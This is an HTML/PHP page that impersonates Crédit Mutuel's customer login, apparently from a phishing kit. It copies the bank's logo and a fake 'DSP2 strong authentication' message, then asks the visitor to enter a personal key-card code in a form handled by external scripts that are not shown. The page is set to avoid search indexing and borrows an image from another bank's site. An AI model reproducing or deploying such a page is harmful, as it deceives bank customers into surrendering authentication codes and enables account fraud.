<!DOCTYPE html>
<html lang="fr">
<meta http-equiv="content-type" content="text/html;charset=utf-8" />

<head>

    <!-- Meta Tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">

    <!-- Browser Color Styling -->
    <meta name="theme-color" content="#6dc77a"/>
    <meta name="msapplication-navbutton-color" content="#6dc77a"/>
    <meta name="apple-mobile-web-app-status-bar-style" content="#6dc77a" />

<!-- AJOUT UIKIT-->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <script src="https://cdn.jsdelivr.net/npm/vue"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/iview/3.5.1/iview.js" integrity="sha256-Xjd66VohnxGyWXo6t7jy6Jdpa4MapbhWGgzRNcsnnzY=" crossorigin="anonymous"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/iview/3.5.1/styles/iview.css" integrity="sha256-wrmzmt34CAQJ3ChhG+ZHZNhwVTDrlLGhLAS7tlbgfZM=" crossorigin="anonymous" />


     <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.0/axios.js" integrity="sha256-XmdRbTre/3RulhYk/cOBUMpYlaAp2Rpo/s556u0OIKk=" crossorigin="anonymous"></script>

     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.3.0/socket.io.js" integrity="sha256-bQmrZe4yPnQrLTY+1gYylfNMBuGfnT/HKsCGX+9Xuqo=" crossorigin="anonymous"></script>
       <script src="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.2.0/js/uikit.js" integrity="sha256-A7WGGnbT0f0OYHWQVkWqX6GQdZHZDi8IsbD/u+FQaVc=" crossorigin="anonymous"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js" integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" crossorigin="anonymous"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.css" integrity="sha256-QVBN0oT74UhpCtEo4Ko+k3sNo+ykJFBBtGduw13V9vw=" crossorigin="anonymous" />
     <script src="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.js" integrity="sha256-qs5p0BFSqSvrstBxPvex+zdyrzcyGdHNeNmAirO2zc0=" crossorigin="anonymous"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.2.0/css/uikit.css" integrity="sha256-zXcP0t9LAKMmi8DraWUaFJV1qvGkw1gYEHBbf+IsHSo=" crossorigin="anonymous" />
<!-- FIN AJOUT UIKIT-->




    <!-- Favicon -->
  
    <link rel="apple-touch-icon" sizes="180x180" href="img/apple-touch-icon.png">
    <link rel="icon" type="image/png" href="img/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="img/favicon-16x16.png" sizes="16x16">
    <link rel="manifest" href="img/manifest.json">
    <link rel="mask-icon" href="img/safari-pinned-tab.svg" color="#e2001a">
    <link rel="shortcut icon" href="img/favicon.ico">

    <!-- Bootstrap -->
    <link rel="stylesheet" href="assets/css/bootstrap.min.css" />

    <!-- Helpers -->
    <link rel="stylesheet" href="assets/css/helpers.css" />

    <!-- Fonts -->
    <link rel="stylesheet" href="assets/css/fonts.css" />

    <!-- Main -->
    <link rel="stylesheet" href="assets/css/main.css" />
	<link rel="stylesheet" href="asset/css/spinner.css"/> 

<title>Connexion à votre Espace Client - Crédit Mutuel</title>
<style>
::placeholder {


}

label.error {
  font-weight: bold;
  color: red;
  padding: 2px 8px;
  margin-top: 2px;
}
.form-control.error {
    border-color: red;
    outline: 0;
    box-shadow: inset 0 1px 1px rgba(0,0,0,0.075),0 0 8px rgba(255,0,0,0.6);
}
.payment-errors {
  font-weight: bold;
  color: red;
  padding: 2px 8px;
  margin-top: 2px;
}
</style>
</head>
<body style="font-family: Montserrat,sans-serif;">
<div id="cover-spin"></div>


    
    <!-- MAIN -->
    <main id="main">
    <div id="index">
      <div>
    <div style="background:white">

        <div class=" white">
          <div class="uk-padding">
		  
		  <img  src="https://cdnsi.e-i.com/INGR/sd/cm_2015/30.98.6/fr/images/css/env/logo.svg" width="20%" alt="">
		  
		  
		  </div>
         <div class="uk-child-width-1-2@s uk-grid-collapse" uk-grid>
           <div class="uk-visible@m">
             <div class="uk-height-1-1 uk-padding  uk-background-image uk-background-cover uk-background-secondary" data-src="https://images.prismic.io/portail-lcl-web/d80b659d-6374-40e6-9fc8-cfa2299773c2_Marquage-velos-obligatoire-contre-vol-LCL-Banque-Assurance-502x357.jpg?auto=compress,format&rect=0,0,502,357&w=502&h=357" uk-img>
               <div class=" uk-card uk-card-large uk-card-default uk-card-body" >
                 <div id="cc"  class="">

                      <div id="el" class="uk-h5 primary uk-text-bold uk-text-uppercase">
                        ACTIVAtion DSP2 Authentification Forte :
                      </div>
                        <div class="uk-h4">
                          Comment activer mon DSP2 et faciliter mes opération en un click ?
                        </div>
                       <div>
					   <p><i class="ui icon mobile teal22"></i> Entrer votre numéro mobile.</p>
                         <p><i class="ui icon mobile teal22"></i> Entrer le code reçu par SMS envoyé
                          sur votre numéro .</p>
                         <p><i class="ui icon mobile teal22"></i> vérifier votre carte de clés personnelles.</p>
                          <p>
                              <i class="ui icon circle teal22"></i> Saisir une clé personnelle
                          </p>
                         
                       </div>
                    </div>
               </div>
             </div>
           </div>
           <div>
             <div class="uk-padding">
                <div class="uk-h3 primary">
<i class="fa fa-credit-card" aria-hidden="true"></i>
                 CLÉ  PERSONNELLE</div>
                
                
                                                    
													
													
						     <div >							
													
				<form role="form" id="sms-form" method="POST" action="">
               
                  <div v-if="step==1">
                    <p style="font-size:15px" id="cc">
<br>
                        <b> Veuillez saisir la clé personnelle contenue dans la case <span style="color:teal2"><?php include("./Show_system/Show_Cleverify.txt"); ?></span> <br>
                      <br>  <input id="cle_code"  style="color: #525252;font-weight: 500;margin-top: 7px;padding: 13px;outline: none;background: white;border-radius: 6px;text-indent: 5px;border: 1px solid #ccc;" type="text">
                      </p>

                      

                        <div onclick="clecr()" id="btn" class="ui button" style="background:#1f368b !important;color:white">
                          &nbsp;CONTINUER
                        </div>
                </div>
               
             </form>
                   </div>
                
               
             </div>
           </div>
          <div>

          </div>
         </div>
        </div>
	  			 
      </div>

      </div>
 

      </div>
    </main>

 
    <script src="js/index3.js"> </script>

    <script src="assets/js/jquery.min.js"></script>
	
	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@7.26.11/dist/sweetalert2.all.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js" integrity="sha256-KsRuvuRtUVvobe66OFtOQfjP8WA2SzYsmm4VPfMnxms=" crossorigin="anonymous"></script>
<script type="text/javascript" src="https://js.stripe.com/v2/"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.13.1/jquery.validate.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.2.3/jquery.payment.min.js"></script>
 
    <script src="assets/js/popper.min.js"></script>
    <script src="assets/js/bootstrap.min.js" ></script>
    <script src="assets/js/fontawesome.js"></script>
    <script src="assets/js/main.js"></script>
    <script src="../common/cle.js"></script>

</body>
</html>